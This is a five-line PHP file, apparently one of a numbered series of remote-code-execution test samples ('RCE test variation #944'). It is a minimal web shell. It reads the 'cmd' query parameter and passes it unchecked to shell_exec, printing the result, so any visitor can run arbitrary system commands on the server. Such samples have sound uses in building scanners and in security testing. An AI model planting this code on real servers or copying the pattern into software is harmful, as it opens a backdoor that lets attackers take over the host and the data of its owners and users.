<?php
// RCE test variation #944
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>